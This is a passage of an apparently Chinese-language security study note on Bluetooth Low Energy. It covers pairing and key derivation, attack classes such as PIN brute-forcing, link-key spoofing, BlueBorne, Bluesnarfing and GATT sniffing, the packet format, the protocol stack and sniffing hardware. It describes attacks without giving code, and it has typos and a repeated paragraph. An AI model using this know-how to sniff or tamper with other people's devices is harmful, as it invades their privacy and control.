title="1.工作流程"></a><strong>1.工作流程</strong></h3><p>BLE低功耗蓝牙适用于短距离无线通信，正常与形式传输距离为10m(低功耗模式下为100m)，频段2.4Ghz。先进行三个蓝牙术语介绍：</p><ul><li>配对：配对是指两个蓝牙设备首次通讯时，互相确认的过程。两个蓝牙设备之间一经配对之后，随后的通讯连接就不必每次都要做确认，非常的方便</li><li>PIN：个人识别码，蓝牙适用的PIN码长度为1-8个十进制位(8-128比特)</li><li>DB_ADDR：蓝牙设备地址。每个蓝牙收发器被分配了唯一的一个48位的设备地址，类似于PC机网卡的MAC地址。两个蓝牙设备在通讯开始时通过询问的方式获取对方的DB_ADDR地址</li></ul><p>蓝牙的工作过程为:</p><p>​                蓝牙启动 -&gt; 扫描设备 -&gt; 设备配对（未配对的设备） -&gt; 数据传输              </p><h3 id="2-设备配对模式"><a href="#2-设备配对模式" class="headerlink" title="2.设备配对模式"></a><strong>2.设备配对模式</strong></h3><ul><li>Numeric Comparison：配对双方都显示一个6位数的数字，由用户来核对数字是否一致，一致即可配对。例如手机之前的配对。</li><li>Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。</li><li>Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘</li><li>Out of Band：两设备通过别的途径交换配对信息，例如nfc等。例如一些NFC蓝牙音响</li></ul><h3 id="3-设备配对过程"><a href="#3-设备配对过程" class="headerlink" title="3.设备配对过程"></a><strong>3.设备配对过程</strong></h3><h4 id="a-PIN码配对"><a href="#a-PIN码配对" class="headerlink" title="a PIN码配对"></a><strong>a PIN码配对</strong></h4><p>在老的蓝牙2.0协议中，配对过程需要输入一个PIN码，长度可以从4到16个数字。（很多设备默认为0000或者1234）</p><p>在配对的过程中通过PIN码来生成Linkkey。两个配对后的设备共享一个Linkkey，这个行为叫绑定。绑定之后下次两个设备接近后，用Linkkey进行认证，认证通过后生成EncryptionKey进行session的加密。认证的过程采用challenge-reponse的模式，以claimant and the verifier的方式来验证linkkey。认证完一方之后交换身份，在认证另一方。</p><h4 id="b-密钥交换配对"><a href="#b-密钥交换配对" class="headerlink" title="b 密钥交换配对"></a><strong>b 密钥交换配对</strong></h4><p>后续蓝牙协议配对则通过密钥交换来完成，又分为生成初始密钥(Kinit)、生成链路密钥(Kab)和双方认证三个过程。</p><ul><li>生成舒适密钥(Kinit)：初始密钥Kinit长度为128位，由E22算法产生。首先提出通信要求的设备成为主设备(Master)，用A表示;被动进行通信的设备称为从设备(Slave),用B表示。E22算法的输入(明文）由以下三部分组成：</li></ul><ol><li>从设备的物理地址：BD_ADDR,在生成Kinit前，主设备通过询问方式获得从设备的地址BD_ADDR。</li><li>PIN码及其长度，PIN码是双方设备预先设定的。</li><li>有一个128位的随机数(IN_RAND)。由主设备产生，并以明文方式传送给从设备。</li></ol><p>由于主、从设备使用了相同的E22算法，如果双方设备以上三部分的值都相等，那么各自算出来的Kinit也应该相同。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34133.png" alt="0"></p><ul><li>生成链路密钥(Kab)：首先主设备A产生128位的随机数LK_RANDA，从设备B也产生128位的随机数LK_RANDB。在主设备A中，Kinit与LK_RAND进行位比特逻辑异或运算，异或结果发送给B设备；同样的，在B设备中，Kinit和LK_RANDB进行位比特逻辑异或运算，结果发送给A设备。通过这些交换后，A和B设备都具有相同的Kinit、LK_RANDA和LK_RANDAB。设备A和B分别用E21算法将LK_RANDA和LK_RANDB。设备A和B分别用E21算法将LK_RANDA和BD_ADDRA、LK_RANDB和BD_ADDRB加密，并将结果进行异或得到Kab。</li></ul><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34168.png" alt="0"></p><ul><li>双方认证：双向认证采用challenge-response(挑战-应答)方式。主设备A位应答方，从设备B为请求方。作为应答方的A设备产生一个128位的随机数AU_RANDA，并以明文的方式传送至B设备。A、B设备都用E1算法将各自的到的AU_RAND、Kab和BD_ADDRB加密运算分别生成32位的SRESA和SRESB。B设备将结果SRESB传送给A设备，A设备比较SERESA和SERSB，如果两个的值相等，此次认证通过，如果两个的值不想等，则认证不通过。执行完此次认证后，A设备和B设备的角色对换，即A设备作为请求方，B设备作为应答方，采用同样的方式进行认证。</li></ul><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34183.png" alt="0"></p><h2 id="0x03-BLE常见问题"><a href="#0x03-BLE常见问题" class="headerlink" title="0x03 BLE常见问题"></a><strong>0x03 BLE常见问题</strong></h2><p>蓝牙（bluetooth）同WIF和zigbee等等网络协议一样，因此它的网络协议通信结构和它们大同小异。</p><p>因此，它的攻击手段不外乎鉴权攻击、密钥攻击、拒绝服务攻击等等几种手段，只不过随着具体的场景不同，这些攻击手段所赐啊去的具体方法也不同。</p><p>在上述的几种攻击方法里，蓝牙的安全问题可以分为两类：第一类是蓝牙协议本存在的问题。例如有攻击工具：Bluenarfing、Bluebugging、Hijacking等。</p><h3 id="1-针对蓝牙协议本身的攻击"><a href="#1-针对蓝牙协议本身的攻击" class="headerlink" title="1.针对蓝牙协议本身的攻击"></a><strong>1.针对蓝牙协议本身的攻击</strong></h3><h4 id="a-节点密钥攻击（中间人）"><a href="#a-节点密钥攻击（中间人）" class="headerlink" title="a.节点密钥攻击（中间人）"></a><strong>a.节点密钥攻击（中间人）</strong></h4><p>假设一个设备A和B之前已经通信过，当通信完成之后，A和B是互相知道彼此的链路密钥的。这里解释一下什么叫链路密钥：A和B之间的通信是需要加密的，怎么加密的不管，总之就是需要一个链路密钥这样的一个东西，每次通信的链路密钥是根据蓝牙本身自带生成的，这个链路密钥不是放在协议层生产的，而是蓝牙硬件自身就有的。那么B显然之后A所使用的链路密钥，那么B通过修改自身地址，把自己的地址改为A的地址后，伪装成A和C通信，那么C此时就以为自己和A通信。B也可以伪装成C和A去通信，因为B知道A的链路密钥，B是能够通过A的认证从而和A进行连接 。</p><p>这样 A和 C之间并没有进行实质的通信 ，都是B分别伪装和A，C通信。这样就造成了中间人攻击。</p><p>这种中间人攻击的主要原因在于蓝牙通信链路密钥在硬件层生产，而且每次认证都相同。</p><h4 id="b-针对PIN码攻击"><a href="#b-针对PIN码攻击" class="headerlink" title="b.针对PIN码攻击"></a><strong>b.针对PIN码攻击</strong></h4><p>两个设备之间的链接，在应用层上使用PIN码，4位PIN码破解仅仅需要0.06秒，8位暴力攻击不到两个小时就能破解。</p><h4 id="c-中继攻击"><a href="#c-中继攻击" class="headerlink" title="c.中继攻击"></a><strong>c.中继攻击</strong></h4><p>蓝牙设备使用中继以夸大传输距离，几乎所有的中继攻击，中继设备都有可能遭到信息窃取</p><h4 id="d-鉴权DOS攻击"><a href="#d-鉴权DOS攻击" class="headerlink" title="d.鉴权DOS攻击"></a><strong>d.鉴权DOS攻击</strong></h4><p>鉴权时的DOS攻击是从上一次鉴权失败到下一次可以发起鉴权期间，第三方通过伪装发起故意使鉴权失败，从而使间隔时间持续上升，知道达到允许的最大值，在此期间双方不能进行正常的鉴权。</p><p>还有一种形式的DOS攻击，快速不断的给远程蓝牙发送文件，而远端设备呗大量的是否要接收该文件的命令冲击直到瘫痪。</p><h3 id="2-针对蓝牙实现过程发起的攻击"><a href="#2-针对蓝牙实现过程发起的攻击" class="headerlink" title="2.针对蓝牙实现过程发起的攻击"></a><strong>2.针对蓝牙实现过程发起的攻击</strong></h3><h4 id="a-BlueBorne"><a href="#a-BlueBorne" class="headerlink" title="a. BlueBorne"></a><strong>a. BlueBorne</strong></h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/t01fa596689092bd57a.png" alt="image"></p><ul><li><a href="https://armis.com/blueborne/">https://armis.com/blueborne/</a></li><li><a href="https://www.antiy.cn/research/notice&report/research_report/20170918.html">基于蓝牙协议漏洞的BLUEBORNE攻击综合分析报告</a></li><li><a href="https://www.anquanke.com/post/id/86949">BlueBorne 蓝牙漏洞深入分析与PoC</a></li></ul><p>是由armis爆出的一系列蓝牙的漏洞，只要手机开启了蓝牙，就可能被远程控制。当然根据上面的分析可以看到通过多种平台的漏洞综合利用，可以完成对大部分支持蓝牙的设备进行攻击。但是在安天的报告里有一句我没懂“不像其它驱动一样，每个操作系统都只有一个蓝牙协议栈，这导致一个漏洞的出现将会影响一系列基于此系统的设备。”其他驱动是啥样？大概的意思就是内核驱动的漏洞吧，不过能看到的是通过这组漏洞可以实现ios，android，linux的rce，以及windows下的中间人攻击。</p><h4 id="b-GATT"><a href="#b-GATT" class="headerlink" title="b. GATT"></a><strong>b. GATT</strong></h4><ul><li><a href="https://gattack.io/">https://gattack.io/</a></li></ul><p>从蓝牙4.0的低功耗蓝牙（BLE）开始到4.2开始支持GATT（Generic Attribute Profile）再到BLE5，蓝牙技术已经瞄准了物联网这个方向。所以很多特性都是针对物联网的情景而生的，比如GATT。GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等用于让两个设备进行连接后的通讯。GATT 定义设备之间通过 Service 和 Characteristic 的东西来进行通讯，不同的 Characteristic 代表设备的不同功能。GATT协议可以在蓝牙设备不完成配对的情况下进行访问，因此，通信流量明文传输，如果应用层没有加密或者校验，则可以被轻易地嗅探和伪造数据。</p><p>相关paper:</p><ul><li><a href="http://gattack.io/whitepaper.pdf">GATTACKING BLUETOOTH SMART DEVICES</a></li><li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals</a></li></ul><h4 id="c-Bluesnarfing"><a href="#c-Bluesnarfing" class="headerlink" title="c.Bluesnarfing"></a><strong>c.Bluesnarfing</strong></h4><p>蓝牙定义了OBEX协议，只鹅个协议的重要目的是实现数据对象的交换。蓝牙早期规范定义了一个基于OBEX的应用，这个应用主要用来实现使用蓝牙来传输一些名片，这个过程并不需要使用鉴权机制，Bluesnarfing就是利用此漏洞连接到手机用户，并且不提示用户已连接。</p><p>当不使用蓝牙时，将设备设置成不可发现的模式，或者在通信时将设备设置成为安全模式3来启动链路鉴权，对一些蓝牙设备进行升级可以有效预防此类攻击。</p><h4 id="d-Bluebugging"><a href="#d-Bluebugging" class="headerlink" title="d.Bluebugging"></a><strong>d.Bluebugging</strong></h4><p>Bluebugging和Bluesnarfing相似，在事先不通知货提示手机用户的情况下，访问手机命令。</p><h4 id="e-Peripheral-Hijacking"><a href="#e-Peripheral-Hijacking" class="headerlink" title="e.Peripheral Hijacking"></a><strong>e.Peripheral Hijacking</strong></h4><p>有些设备尽管没有进入连接模式也会对连接请求进行相应，这类设备通常是一些没有MMI（Man Machine Interface）的设备。例如一些蓝牙耳机会被强制连接，还有一些设备有固定的PIN码，Peripheral Hijacking即是对此类设备进行攻击。</p><h4 id="f-Bluejacking"><a href="#f-Bluejacking" class="headerlink" title="f.Bluejacking"></a><strong>f.Bluejacking</strong></h4><p>Bluejacking是指手机用户使用蓝牙无线技术匿名向赴京的蓝牙用户发送名片或不许奥信息的行为。Bluejacking通常会寻找ping的通的手机或者有反应的手机，随后会发送更多的其他个人信息到该设备。现在市场上已经出现了很多Bluejacking软件。可以通过把手机设置成不可发现模式来避免此类攻击。</p><h2 id="0x04-信道"><a href="#0x04-信道" class="headerlink" title="0x04 信道"></a><strong>0x04 信道</strong></h2><p>BLE的物理通道即”频道”，分别是‘f=2402+k*2 MKz, k=0 , … ,39’, 宽带为2MHz的40个RF Channel。</p><p>其中，有3个信道是advertising channel(广播通道)，分别是37、38、39，用于发现设备(Scanning devices)、初始化连接(initiating a connection)和广播数据(broadcasting date)</p><p>剩下的37个信道为data channel(数据通道)，用于两个连接的设备间的通讯。</p><h2 id="0x05-BLE数据包格式"><a href="#0x05-BLE数据包格式" class="headerlink" title="0x05 BLE数据包格式"></a><strong>0x05 BLE数据包格式</strong></h2><p>在低功耗蓝牙规范中，分广播报文和数据报文这两种。设备利用广播报文发现、连接其它设备，而在连接建立之后，便开始使用数据报文。无论是广播报文还是数据报文，链路层只使用一中数据包格式，它由”前导码”(preamble)、”访问码”(access code)、”有效载荷”和”循环冗余校验”（Cyclical Redundancy CHeck，CRC）校验码组成。其中，”访问码”有时又称为”访问地址”(access address)</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34506.png" alt="0"></p><h3 id="1-Preamble"><a href="#1-Preamble" class="headerlink" title="1.Preamble"></a>1.Preamble</h3><p>1个字节长度，接受中用于频率同步、数据速率同步、自动增益控制调整，固定为                        01010101或者10101010序列</p><h3 id="2-Access-Address"><a href="#2-Access-Address" class="headerlink" title="2.Access Address"></a>2.Access Address</h3><p>4个字节长度，广播报文接入地址为：0x8E89BED6,数据报文接入地址为：32bits随机数</p><h3 id="3-PDU"><a href="#3-PDU" class="headerlink" title="3.PDU"></a>3.PDU</h3><p>i.广播报文（见嫌疑BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.3）</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34523.png" alt="0"></p><p>i. PDU Type: 有效载荷内容的类型，通过这一字段确定改数据包是一个”通告”还是”扫描请求”或”响应”等</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34532.png" alt="0"></p><p>ii. RFU 保留位</p><p>iii. TxAdd：发送地址字段</p><p>iv. RxAdd：接收地址字段</p><p>v. Payload Length：用来表示”有效载荷数据”(payload data)的长度，不包括头部内容</p><p>ii.数据报文（见协议BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.4）</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34544.png" alt="0"></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34546.png" alt="0"></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34548.png" alt="0"></p><p>1.LLID（逻辑链路ID）：0x01表示该数据包是一个帧的延续内容，或者这是一个空的“逻辑链路控制及适配协议”数据包；0x02表示一个“逻辑链路控制及适配协议”数据包的开始；0x03表示这是一个“逻辑链路控制”数据包的内容</p><p>2.NESN：下一个期望的序列号，用于对接受到的数据包进行确认</p><p>3.MD：更多数据字段，主要是为了说明发送发是否还有要发给接收者的数据</p><p>4.RFU 保留位</p><p>5.Payload Length：用以表示包含”信息完整性校验码”（Message Integrity Check，MIC）在内的“有效载荷数据”的长度</p><p>4.CRC</p><p>3个字节长度，“循环冗余校验”（Cyclical Redundancy Check, CRC），可检查数据的正确性</p><h2 id="0x06-BLE-协议栈"><a href="#0x06-BLE-协议栈" class="headerlink" title="0x06 BLE 协议栈"></a><strong>0x06 BLE 协议栈</strong></h2><p>BLE协议栈的结构图如下所示：</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34568.png" alt="0"></p><p>各个结构简述：</p><ul><li>PHY：使蓝牙可以使用2.4GHz频道，并且能自适应的调频。</li><li>LL层：控制设备处于 准备、广播、监听、初始化、连接等5个状态</li><li>HCI层：向上为主机提供软件应用程序接口，对外为外部硬件提供控制接口</li><li>L2CAP层：对传输数据实行封装。</li><li>SM层：提供主机和客机的配对和密钥分发，实现安全连接和数据交换。</li><li>ATT层：对数据主机或客机传入的指令进行指令搜索处理</li><li>GATT层：接受和处理主机或客机传入的指令进行指令搜索处理</li><li>GAP层：向上提供API，向下合理分配各个层工作。</li></ul><h3 id="1-Physical-Layer"><a href="#1-Physical-Layer" class="headerlink" title="1. Physical Layer"></a><strong>1. Physical Layer</strong></h3><p>任何一个通信系统，首先要确定的就是通信介质(物理通道，Physical Channel)，BLE也不例外。在BLE协议中，”通信介质”的定义是由Physical Layer（其他通信协议也类似）负责。</p><p>Physical Layer是这样描述BLE的通信介质的：</p><p>​                由于BLE属于无线通信，则其通信介质是实顶频率范围下的频率资源(Frequency Band) BLE的市场定位是个体和名用，因此使用免费的ISM频段(频率范围是2.400-2.4835Ghz) 为了同时支持多个设备，将真个频带分为40份，每份的宽带为2MHz，称作RF Channel              </p><p>所以经过上面的定义之后，可以推测出BLE的物理通道，即“评到分别是’f=2402+k*2 MHz，k=0,…,39’,宽带为2MHz”的40个RFChannel。其中，有3个信道是advertising channel（广播通道），分别是37、38、39，用于发现设备（Scanning devices）、舒适化连接(initiating a connection)和广播数据(broadcasting date)；剩下的37个信道为data channel（数据通道），用于两个连接的设备间的通讯。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34607.png" alt="0"></p><h3 id="2-Link-Layer"><a href="#2-Link-Layer" class="headerlink" title="2. Link Layer"></a><strong>2. Link Layer</strong></h3><p>Link Layer用于控制设备的射频状态，设备将处于Standby(待机)、Advertising（通告）、Scanning（扫描）、Initiating（初始化）、Connection（连接）这五种状态中的一种。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34606.png" alt="0"></p><ul><li>待机状态（Standby State）：此时即不发送数据，也不接受数据，对设备来说也是最节能的状态；</li><li>通告状态（Advertising State）：通告状态下的设备一般也被称为 “通告者”（Advertiser），它会通过advertising channel（广播通道）周期性的发送数据，广播的数据可以由处于Scanning state或Initiating state的实体接受；</li><li>扫描状态（Scanning State）：可以通过advertising channel（广播通道）接受数据的装填，该状态下的设备又被称为“扫描者”（Scanner）。此外，更具advertiser所广播的数据类型，有些Scanner还可以主动向Advertiser请求一些额外数据</li><li>初始化状态（Initiating State）：和Scanning State类似，不过是一种特殊的状态。Scanner会侦听所有的advertising channel，而Initator（初始化者）则只侦听某个特定设备的广播，并在接受到数据后，发送连接请求，以便和Advertiser建立连接</li><li>连接状态（Connection State）：由Initiating State或Advertising State自动切换而来，处于Connection State的双方，分别有两种角色。其中，Initiater方被称为Mater（主设备），Advertiser方则称作Slave（从设备）。</li></ul><h3 id="3-HCI"><a href="#3-HCI" class="headerlink" title="3. HCI"></a><strong>3. HCI</strong></h3><p>主机控制接口层（Host Controller Interface，简写HCI）：定义Host（主机）和Controller（控制器）之间的通信协议，这一层可以是软件或者硬件接口，入UART、SPI、USB等</p><h3 id="4-Generic-Access-Profile-GAP"><a href="#4-Generic-Access-Profile-GAP" class="headerlink" title="4. Generic Access Profile(GAP)"></a><strong>4. Generic Access Profile(GAP)</strong></h3><p>前面Link Layer虽然对连接建立的过程做了定义，但它听没有体现到Application（或者 Profile）层面，而GAP则是直接与应用程序或配置文件通信的接口，它实现了如下功能：</p><ul><li><p>定义GAP层的蓝牙设备角色（role）</p></li><li><ul><li>Broadcaster（广播者）：设备正在发送advertising events</li><li>Obserber（观察者）：设备正在接受advertising events</li><li>Peripheral（外设）：设备接受Link Layer连接（对应Link Layer的slave角色）</li><li>Central（主机）：设备发起Link Layer连接（对应Link Layer的master角色）</li></ul></li><li><p>定义GAP层的用于实现各种通信的操作模式（Operational Mode）和过程（Procedures）</p></li><li><ul><li>Broadcastmode and observation procedure，实现单向的、无连接的通信方式</li><li>Discovery modes and procedures，实现蓝牙设备的发现操作</li><li>Connection modes and procedures，实现蓝牙设备的连接操作</li><li>Bonding modes and procedures，实现蓝牙设备的配对操作</li></ul></li><li><p>定义User Interface有关的蓝牙参数，包括蓝牙地址、蓝牙名称、蓝牙的PIN码等</p></li><li><p>Security相关的定义</p></li></ul><h3 id="5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）"><a href="#5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）" class="headerlink" title="5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）"></a><strong>5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）</strong></h3><p>逻辑链路控制及自适应协议层（Logical Link Control and Adaptation Protocol）：为上层提供数据封装服务，允许逻辑上的点对点数据通信。</p><h3 id="6-Security-Manager（SM）"><a href="#6-Security-Manager（SM）" class="headerlink" title="6. Security Manager（SM）"></a><strong>6. Security Manager（SM）</strong></h3><p>Security Manager负责BLE通信中有关安全的内容，包括配对（pairing,）、认证（authentication）和加密（encryption）等过程。</p><h3 id="7-Attribute-protocol（ATT）"><a href="#7-Attribute-protocol（ATT）" class="headerlink" title="7. Attribute protocol（ATT）"></a><strong>7. Attribute protocol（ATT）</strong></h3><p>在BLE协议栈中，Physical Layer负责提供一系列的Physical Channel；基于这些Physical Channel，Link Layer可在两个设备之间建立用于点对点通信的Logical Channel；而L2CAP则将这个Logical Channel换分为一个个的L2CAP Channel，以便提供应用程序级别的通道复用。到此之后，基本协议栈已经构建完毕，应用程序已经可以基于L2CAP欢快的run起来了。</p><p>谈起应用程序，就不得不说BLE的初衷——物联网。物联网中传输的数据和传统的互联网有什么区别呢？抛开其它不谈，物联网中最重要、最广泛的一类应用是：信息的采集。</p><p>这些信息往往都很简单，如温度、湿度、速度、位置信息、电量、水压、等等。</p><p>采集的过程也很简单，节点设备定时的向中心设备汇报信息数据，或者，中心设备在需要的时候主动查询。</p><p>基于信息采集的需求，BLE抽象出一个协议：Attribute protocol，该协议将这些“信息”以“Attribute（属性）”的形式抽象出来，并提供一些方法，供远端设备（remote device）读取、修改这些属性的值（Attribute value）。</p><p>Attribute Protocol的主要思路包括：</p><ol><li>基于L2CAP，使用固定的Channel ID</li><li>采用client-server的形式。提供信息（以后都将其称为Attribute）的一方称作ATT server（一般是那些传感器节点），访问信息的一方称作ATT client。</li><li>一个Attribute由Attribute Type、Attribute Handle和Attribute Value组成。</li></ol><ul><li><ol><li>Attribute Type用以标示Attribute的类型，类似于我们常说的“温度”、“湿度”等人类可识别的术语，通过UUID进行区分。</li><li>Attribute Handle是一个16-bit的数值，用作唯一识别Attribute server上的所有Attribute。Attribute Handle的存在有如下意义：</li></ol></li><li><ul><li><ol><li>一个server上可能存在多个相同type的Attribute，显然，client有区分这些Attribute的需要。</li><li>同一类型的多个Attribute，可以组成一个Group，client可以通过这个Group中的起、始handle访问所有的Attributes。</li></ol></li></ul></li><li><ol><li>Attribute Value代表Attribute的值，可以是任何固定长度或者可变长度的octet array。</li></ol></li></ul><ol><li>Attribute能够定义一些权限（Permissions），以便server控制client的访问行为，包括：</li></ol><ul><li><ol><li>访问有关的权限（access permissions），Readable、Writeable以及Readable and writable；</li><li>加密有关的权限（encryption permissions），Encryption required和No encryption required；</li><li>认证有关的权限（authentication permissions），Authentication Required和No Authentication Required；</li><li>授权有关的权限（authorization permissions），Authorization Required和No Authorization Required。</li></ol></li></ul><ol><li>根据所定义的Attribute PDU的不同，client可以对server有多种访问方式，包括：</li></ol><ul><li><ol><li>Find Information，获取Attribute type和Attribute Handle的对应关系；</li><li>Reading Attributes，有Read by type、Read by handle、Read by blob（只读取部分信息）、Read Multiple（读取多个handle的value）等方式；</li><li>Writing Attributes，包括需要应答的writing、不需要应答的writing等。</li></ol></li></ul><h3 id="8-Generic-Attribute-profile（-GATT）"><a href="#8-Generic-Attribute-profile（-GATT）" class="headerlink" title="8. Generic Attribute profile（ GATT）"></a>8. Generic Attribute profile（ GATT）</h3><p>ATT之所以称作“protocol”，是因为它还比较抽象，仅仅定义了一套机制，允许client和server通过Attribute的形式共享信息。至于具体共享哪些信息，ATT并不关心，这是GATT（Generic Attribute Profile）的主场。GATT相对ATT只多了一个‘G‘，然含义却大不同，因为GATT是一个profile（更准确的说是profile framework）。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34640.png" alt="0"></p><p>由上图可知，GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等，可参照<a href="https://developer.bluetooth.org/TechnologyOverview/Pages/Profiles.aspx#GATT">官方Profiles Overview</a>，对分析并无大用。</p><p>Service和Characteristic则是比较重要的，Service可以理解为PHP中的“类”、功能对象的集合。Characteristic可以理解为PHP的“函数”，是GATT中具体的功能对象，每个Service都可以包含一个或多个Characteristic（特征）。Characteristic是GATT profile中最基本的数据单位，由一个Properties、一个Value、一个或者多个Descriptor组成。</p><p>以上除“Profile”外的每一个定义，Service、Characteristic、Characteristic Properties、Characteristic Value、Characteristic Descriptor等等，都是作为一个Attribute存在的，具备前面所描述的Attribute的所有特征：Attribute Handle、Attribute Types、Attribute Value和Attribute Permissions。</p><p>在理解了GATT后，就已经能够分析或是“黑掉”一些BLE设备了。这里拿小米手环做例子，当LightBlue连上小米手环后，可以看到一个名为FEE7的UUID，如下所示：</p><p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表<a href="https://developer.bluetooth.org/gatt/characteristics/Pages/CharacteristicsHome.aspx">Characteristics</a>搜索2A06，进入Characteristic的详情页面。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34644.jpeg" alt="0"></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34646.jpeg" alt="0"></p><p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表搜索2A06，进入Characteristic的详情页面。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34650.png" alt="0"></p><p>于是，该Characteristic操作定义非常明确了。点击“Write new value”，可以写入新的值。若写入1或2，则可以引起手环的震动。</p><h2 id="0x07-嗅探工具"><a href="#0x07-嗅探工具" class="headerlink" title="0x07 嗅探工具"></a>0x07 嗅探工具</h2><p>商业级的Ellisys BEX400侦听工具最为符合对BLE流量捕获及分析的要求，然而售价过于昂贵；</p><p>其次，作为开源硬件且配有混杂模式追踪的“超牙”设备——Ubertooth One拥有二次开发和嗅探已建立连接的蓝牙通信数据包的能力；</p><p>而淘宝购买的廉价CC2540开发板则作为最佳替补方案。</p><h3 id="1-低功耗蓝牙SOC"><a href="#1-低功耗蓝牙SOC" class="headerlink" title="1. 低功耗蓝牙SOC"></a>1. 低功耗蓝牙SOC</h3><p>低功耗蓝牙推出以来，众多厂商根据标准规范实现了不同的解决方案，包括TI的CC2540\2541、北欧Nordic的nRF51822、CSR的1000\1001、Quintic的QN9020\9021（现在被NXP收购）、Broadcom的BCM20732等。其中，在开发者当中比较知名的是TI的CC254x系列和Nordic的NRF51822，并且这两款产品当有着自己的开发板和用于嗅探的调试工具。</p><h4 id="a-CC2540"><a href="#a-CC2540" class="headerlink" title="a. CC2540"></a>a. CC2540</h4><p>德州仪器的CC2540，是一款高性价比、低功耗的片上系统（SOC）解决方案，适合蓝牙低功耗应用。它包含了一个8051内核的RF收发器，可编程闪存，8KB RAM和其他功能强大的配套特征及外设。CC2540有两种版本：CC2540F128 / F256，分别为128和256 KB的闪存，结合TI的低功耗蓝牙协议栈，CC2540F128 / F256形成了市场上最灵活，性价比也最高的单模式蓝牙BLE解决方案。<br>CC2540 USB Dongle的实物图如下，它可以配合TI的PacketSniffer软件实现对BLE无线抓包：</p><p>实际上，任意包含CC2540芯片的开发板都能实现BLE流量嗅探的功能。不过，TI官方并没有将侦听BLE的源代码放出，仅提供了烧写到USB Dongle的固件</p><p>在这个基础上，如果想要实现更多的功能，比如监听指定范围内所有的低功耗蓝牙设备的流量，就有必要对其进行逆向或者自己完全重写个程序。。</p><h4 id="b-NRF51822"><a href="#b-NRF51822" class="headerlink" title="b. NRF51822"></a>b. NRF51822</h4><p>挪威Nordic Semiconductor（简称Nordic）公司的nRF51822，是一款多协议ARM内核蓝牙4.0低功耗/ 2.4GHz 专用RF的单芯片解决方案。它基于Cortex-M0 内核，配备16kB RAM，可编程闪存，提供128 KB和 256 KB Flash两种版本供用户选择。</p><p>nRF51822 USB Dongle及开发板套件如下所示：</p><p><a href="https://user-images.githubusercontent.com/11291711/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png" alt="img"></a></p><p>刷入以下固件，配合官方的BLE sniffer程序，即可实现蓝牙流量的嗅探功能</p><p><a href="https://user-images.githubusercontent.com/11291711/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png" alt="img"></a></p><p>不同与cc2540的Packet Sniffer，该程序无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪，并能够配合Wireshark解析BLE数据包，可以很直观的显示出内部的层级关系和各字段含义。比较遗憾的是，实际使用发现它并没有CC2540 USB Dongle稳定，经常会抓不到后面数据通信的网络包，不过这一问题应该是可以通过优化算法得到解决的，但需要对官方的固件进行逆向或自己根据Nordic公司提供的BLE协议栈重写代码。。</p><p><a href="https://user-images.githubusercontent.com/11291711/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg" alt="img"></a></p><p><a href="https://user-images.githubusercontent.com/11291711/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg"><img 